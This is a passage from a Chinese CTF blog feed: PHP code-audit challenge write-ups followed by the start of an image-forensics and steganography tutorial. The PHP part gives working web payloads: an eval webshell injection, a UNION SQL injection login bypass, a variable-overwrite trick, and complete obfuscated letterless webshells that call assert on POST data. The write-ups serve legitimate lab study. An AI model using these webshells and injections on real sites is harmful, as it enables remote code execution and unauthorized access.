nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>查看出现flag的要求</p><p>（1）a:</p><p>没有‘.’字符，或者’.’在字符串的第一位</p><p>（2）b:</p><p>长度大于5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4</span><br></pre></td></tr></table></figure><p>截取b第一位和111拼接在于1114匹配（这里为111或者1114）</p><p>这里涉及到了%00，当我们substr截取遇到%00截断时，我们substr截取的字符串就会被%00截断，</p><p>b的第一位不为4</p><p>（3）id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&#x27;id&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">    header(&#x27;Location: challenge3.php?id=1&#x27;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不为0或NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时我们在if语句中发现这里对id进行了php的弱比较</p><p>弱比较这里当我们用一个字符串和数字比较的时候，字符串会去他开头的有效数字，如果这里没有有效数字则会取值为0，</p><p>所以这里我们要要求a不为0或null同时要让其&#x3D;0，所以我们这里可以使用令a位一个字符开头的任意字符串（开头不为有效数字取值为0）</p><p>（4）data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = @file_get_contents($a,&#x27;r&#x27;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot;)</span><br></pre></td></tr></table></figure><p>这里我们使用file_get_contents获取对应文件内容</p><p>这里我们采用php:&#x2F;&#x2F;input（$data&#x3D;@file_get_contents(‘php:&#x2F;&#x2F;input’,’r’)）</p><p>这样这里$data就是获取的post传入的参数</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/630333dc0b79b.png" alt="QQ截图20220822154417.png"></p><h2 id="4-challenge4"><a href="#4-challenge4" class="headerlink" title="(4)challenge4"></a>(4)challenge4</h2><p>下载环境</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/6302e5b3274e1.png" alt="QQ截图20220822101040.png"></p><p>发现这里有eval函数猜测与代码执行有关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;var_dump($a);&quot;);</span><br><span class="line">使用了双引号所以会先进行解析a参数，然后在执行eval函数</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=);eval($_POST[&#x27;A&#x27;]);%23</span><br></pre></td></tr></table></figure><p>然后蚁剑连接</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/6302e8447fcbb.png" alt="QQ截图20220822102142.png"><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/6302e846bcb32.png" alt="QQ截图20220822102145.png"></p><h2 id="5-challenge5"><a href="#5-challenge5" class="headerlink" title="(5)challenge5"></a>(5)challenge5</h2><p>下载环境</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/6302ecebe5fd0.png" alt="QQ截图20220822103833.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])</span><br><span class="line">        echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;;</span><br><span class="line">    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))</span><br><span class="line">      die(&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里我们可以发现name和password不能一样</p><p>但是我们这里要求通过sha1令两者一致（这里使用了“&#x3D;&#x3D;&#x3D;”无弱类型比较）这里考虑到sha1无法处理数组</p><p>所以满足两者我们就构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=1&amp;password[]=3</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/6302ecec6197a.png" alt="QQ截图20220822104132.png"></p><h2 id="6-challenge6"><a href="#6-challenge6" class="headerlink" title="(6)challenge6"></a>(6)challenge6</h2><p>下载环境</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/63032d17c7b7c.png" alt="QQ截图20220822151517.png"></p><p>观察代码发现这里爆出flag的条件为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd])))</span><br><span class="line">//strcasecmp 若两值相同的话返回结果为0</span><br></pre></td></tr></table></figure><p>要pwd的列中有值同时要让pass值与pwd列中的值相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select pwd from interest where uname=&#x27;$user&#x27;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br></pre></td></tr></table></figure><p>这里我们发现$sql直接拼接$user后执行sql语句并且将结果返回至query所以猜测这里存在sql注入</p><p>这里遇到的问题是我们并不知道pwd列中有什么值进而不知道应该传什么值给pass才能符合要求</p><p>这个时候我们就要考虑到了union的用法</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/630330b2c77a4.png" alt="QQ截图20220822153039.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/630330b312792.png" alt="QQ截图20220822153046.png"></p><p>可以看到当我们执行union select 123的时候会将123也列入到age的列中（在第一个select语句中被使用的列名称也会被用于结果的列名称当中）</p><p>所以我们这里就可以使用这种方法用union select将一个值传入到pwd的列中进而我们传递对应md5值给pass即可同时满足pwd列不为0和pass可以与pwd列值匹配的两个要求</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&#x27; union select &quot;21232f297a57a5a743894a0e4a801fc3&quot;#&amp;pass=admin</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/22/6303339b8c22f.png" alt="QQ截图20220822154313.png"></p><h2 id="7-challenge7"><a href="#7-challenge7" class="headerlink" title="(7)challenge7"></a>(7)challenge7</h2><p>下载环境</p><p>目录扫描发现php源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$_403 = &quot;Access Denied&quot;;</span><br><span class="line">$_200 = &quot;Welcome Admin&quot;;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line">foreach ($_POST as $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$$猜测是变量覆盖的题型</p><p>这里我们可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br></pre></td></tr></table></figure><p>所以我们这里需要post对flag进行赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line">foreach ($_POST as $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">    die($_403);</span><br></pre></td></tr></table></figure><p>这里要求我们post传入的flag的值要与本身的flag值要一致</p><p>所以这里我们就要对本身的flag值进行变量覆盖，然后顺的思路如果把本身的flag都覆盖了我们怎么获取flag，所以我们就考虑在get传参中将flag值覆盖出去，而这里可以输出的参数只有_200所以我们就考虑将flag的原值覆盖 _200</p><p>当我们get传入_200&#x3D;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line">    $$key = $$value</span><br></pre></td></tr></table></figure><p>$key&#x3D;_200</p><p>$value&#x3D;flag</p><p>$$key&#x3D;$_200</p><p>$$value&#x3D;$flag</p><p>$$key&#x3D;$$value&#x3D;&#x3D;&#x3D;&#x3D;&gt;$_200&#x3D;$flag</p><p>然后我们在post任意传参flag的值进行覆盖原值，以flag&#x3D;aaa为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foreach ($_POST as $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br></pre></td></tr></table></figure><p>$flag&#x3D;aaa</p><p>之后执行到die($_200)输出$_200就会是flag值</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/631383ee78ce5.png" alt="QQ截图20220904004209.png"></p><h2 id="8-challenge8"><a href="#8-challenge8" class="headerlink" title="(8)challenge8"></a>(8)challenge8</h2><p>下载环境</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/63145e6aa36a4.png" alt="QQ截图20220904161416.png"></p><p>前置知识:</p><h3 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h3><p>我们有时候会遇到正则将字母数字都过滤的情况这个时候如果要webshell的时候我们就需要编写一个无字母数字的webshell</p><p>这里的思路是通过非字母数字的字符经过变化然后构造出我们想要字母然后再利用PHP动态函数(<strong>file_put_contents</strong>,    <strong>assert</strong>(要注意php7中无法以一个动态函数运行),<strong>system</strong>)进行动态执行</p><p>而这里我们就要考虑如何通过非字母数字的字符来变化得到我们想要的字母</p><h4 id="a-异或运算-a-b"><a href="#a-异或运算-a-b" class="headerlink" title="a.异或运算(a^b)"></a>a.异或运算(a^b)</h4><p>首先了解一下异或运算的运算原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;B&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//(1)首先会先将左右字符转换为ascii值  B---66       ?----63</span><br><span class="line">//(2)第二部会将其ascii值转换为二进制  66--1000010   63--0111111</span><br><span class="line">//(3)第三步会进行二进制异或处理（每位对比相同为0不同为1）： 1111101</span><br><span class="line">//(4)第三步将二进制转为ascii字符：&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/631464f48c39f.png" alt="QQ截图20220904164221.png"></p><p>通过这种方法我们就可以做到异或出动态函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure><p>应用的时候只需要将其整理到url栏中并post传入_&#x3D;’命令’即可</p><h4 id="b-自增"><a href="#b-自增" class="headerlink" title="b.自增"></a>b.自增</h4><p>在php种我们进行自增的时候可以对应ascii自增获取下一个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;a&#x27;++---&gt;&#x27;b&#x27;   </span><br><span class="line">&#x27;A&#x27;++---&gt;&#x27;B&#x27;</span><br></pre></td></tr></table></figure><p>所以当我们表示出a和A的时候通过自增我们就可以获得到所有字母达到绕过</p><p>所以我们这里就要考虑去哪里获取a和A（同时我们要不能涉及字母）</p><p>这里我们考虑到php种当我们将字符串和数组强制连接的时候会转换字符串值Array，这样我们就得到了a和A</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/63146f2de88a8.png" alt="QQ截图20220904172559.png"></p><p>更具这种方法即可进行绕过这里放上p神的websehll</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure><p>应用的时候只需要将其整理到url栏中并post传入_&#x3D;’命令’即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-challenge1&quot;&gt;&lt;a href=&quot;#1-challenge1&quot; class=&quot;headerlink&quot; title=&quot;(1)challenge1&quot;&gt;&lt;/a&gt;(1)challenge1&lt;/h2&gt;&lt;p&gt;访问靶场位置我们可以发现给出一串字符然后对php代码审计</summary>
      
    
    
    
    <category term="PHP审计" scheme="http://just-aleaf.github.io/categories/PHP%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP审计" scheme="http://just-aleaf.github.io/tags/PHP%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MISC</title>
    <link href="http://just-aleaf.github.io/2022/08/10/MISC/"/>
    <id>http://just-aleaf.github.io/2022/08/10/MISC/</id>
    <published>2022-08-10T15:08:55.000Z</published>
    <updated>2022-09-14T15:51:19.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><p>通过ctfshow平台挑选选了一些代表性的misc入门知识</p><h2 id="1-bpg文件读取"><a href="#1-bpg文件读取" class="headerlink" title="(1)bpg文件读取"></a>(1)bpg文件读取</h2><p>下载附件给了一个bpg后缀文件</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/10/62f3caa661129.jpg" alt="QQ截图20220810231100.jpg"></p><p><a href="https://bellard.org/bpg/">BPG Image format (bellard.org)</a></p><p>这里我们使用bpg工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpgview.exe E:\ctf\misc3.bpg</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/10/62f3cb0ab478d.jpg" alt="QQ截图20220810231256.jpg"></p><h2 id="2-文件头识别"><a href="#2-文件头识别" class="headerlink" title="(2)文件头识别"></a>(2)文件头识别</h2><p>下载附件发现6个txt文件hex打开查看</p><p>第一个发现是png文件头将后缀更改获得照片这里猜测这里就是更具文件头修改后缀</p><p>那就需要了解一下各个文件的文件头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">A.JPEG</span><br><span class="line"></span><br><span class="line">文件头:FF D8 FF</span><br><span class="line"></span><br><span class="line">文件尾:FF D9</span><br><span class="line"></span><br><span class="line">B.PNG</span><br><span class="line"></span><br><span class="line">文件头:89 50 4E 47 0D 0A 1A 0A</span><br><span class="line"></span><br><span class="line">文件尾:AE 42 60 82</span><br><span class="line"></span><br><span class="line">C.GIF</span><br><span class="line"></span><br><span class="line">文件头:47 49 46 38 39(37) 61</span><br><span class="line"></span><br><span class="line">文件尾:00 3b</span><br><span class="line"></span><br><span class="line">D.BMP</span><br><span class="line"></span><br><span class="line">文件头:42 4D</span><br><span class="line"></span><br><span class="line">E.TIFF(tif)</span><br><span class="line"></span><br><span class="line">文件头：49 49 2A 00</span><br></pre></td></tr></table></figure><p>然后对应文件头修改文件后缀即可获得flag</p><h2 id="3-LINUX的DD命令读取"><a href="#3-LINUX的DD命令读取" class="headerlink" title="(3)LINUX的DD命令读取"></a>(3)LINUX的DD命令读取</h2><p>下载附件后发现又是一张jpg文件</p><p>binwalk隐写直接走但是发现这里确实有隐写，但是无法提取出来</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/13/62f67bb9ea426.png" alt="QQ截图20220813001101.png"></p><p>通过看大佬文章才知道这里可用dd命令提取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dd if=misc14.jpg of=misc.jpeg skip=2103 bs=1</span><br><span class="line">if=文件名: 后面跟随输入文件名（读取的文件）</span><br><span class="line">of=文件名: 跟随输出的文件名</span><br><span class="line">skip=blocks: 从输入文件开头跳过blocks个块后再开始复制</span><br><span class="line">bs=bytes: 同时设置读入/输出的块大小为bytes个字节</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/13/62f67bb98d1d0.png" alt="QQ截图20220813001109.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/13/62f67bbb54fd5.png" alt="QQ截图20220813001117.png"></p><h2 id="4-EXIF文件信息读取"><a href="#4-EXIF文件信息读取" class="headerlink" title="(4)EXIF文件信息读取"></a>(4)EXIF文件信息读取</h2><p>有时候flag可能藏在图片文件的信息中当我们右键查看属性的时候通畅获取不到图片的全部信息</p><p>这个时候我们就要借助在线网站获取exif信息</p><p><a href="https://exif.tuchong.com/">EXIF信息查看器 (tuchong.com)</a></p><p>或者使用kali中的exiftool</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/05/63160ce93685f.png" alt="QQ截图20220905225102.png"></p><h2 id="5-zsteg"><a href="#5-zsteg" class="headerlink" title="(5)zsteg"></a>(5)zsteg</h2><p>zsteg可以检测PNG和BMP图片中隐写的数据</p><p>zsteg安装(kali)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）换源</span><br><span class="line"></span><br><span class="line">gem sources --remove https://rubygems.org/  //删除现有源</span><br><span class="line">gem sources -a http://gems.ruby-china.com/   //添加新源头</span><br><span class="line">apt-get install gem   //安装gem</span><br><span class="line">gem install zsteg  //安装zsteg</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314c51139204.png" alt="QQ截图20220904233218.png"></p><h2 id="6-binwalk-foremost"><a href="#6-binwalk-foremost" class="headerlink" title="(6)binwalk+foremost"></a>(6)binwalk+foremost</h2><p>当文件中包含多个文件的时候我们就用到了binwalk和foremost</p><p>binwalk可以查看文件中隐藏文件并且可以进行提取</p><p>foremost也可以进行提取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binwalk xxx.png    //查找是否包含文件</span><br><span class="line">binwalk -e xxx.png //提取</span><br><span class="line">foremost XXX.png   //提取</span><br></pre></td></tr></table></figure><h2 id="7-IDAT块隐写"><a href="#7-IDAT块隐写" class="headerlink" title="(7)IDAT块隐写"></a>(7)IDAT块隐写</h2><p>IDAT:</p><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块(一张图片可以有很多IDAT块)</p><p>IDAT会有固定的长度正常png文件只有最后一个IDAT块的长度会比其他的短</p><p>而IDAT的隐写就出现在这里，中间会有IDAT的长度异常</p><p>这时候我们一般会用到TweakPng工具查看操作IDAT块</p><p><a href="http://entropymine.com/jason/tweakpng/">TweakPNG (entropymine.com)</a></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314c9cd536c1.png" alt="QQ截图20220904235239.png"></p><p>删除之后即可出现flag</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314ca0683599.png" alt="QQ截图20220904235337.png"></p><h2 id="8-MagicEXIF元数据编译器"><a href="#8-MagicEXIF元数据编译器" class="headerlink" title="(8)MagicEXIF元数据编译器"></a>(8)MagicEXIF元数据编译器</h2><p><a href="https://www.magicexif.com/start">https://www.magicexif.com/start</a></p><p>MagicEXIF是一款可以通过分析照片的元数据以及编码特征来计算图像可信度进行判断照片是否被修改，可以对相机的快门次数，镜头参数，光圈挡位查看和编译</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/05/631611d90b035.png" alt="QQ截图20220905231219.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/05/63161205317d2.png" alt="QQ截图20220905231301.png"></p><h2 id="9-时间戳转换获取"><a href="#9-时间戳转换获取" class="headerlink" title="(9)时间戳转换获取"></a>(9)时间戳转换获取</h2><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/05/63161697d9d5e.png" alt="微信截图_20220905233215.png"></p><p>exiftool可以发现注释中提示了UnixTimestap(Timestap时间戳)，DECtoHEX（十进制转换十六进制）</p><p>所以我们需要转换时间戳</p><p><a href="https://tool.chinaz.com/tools/unixtime.aspx">Unix时间戳(Unix timestamp)转换工具 - 站长工具 (chinaz.com)</a></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/05/6316177d588a4.png" alt="QQ截图20220905233557.png"></p><p>通过四个时间戳转化获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">874865822 2699237688 2156662245 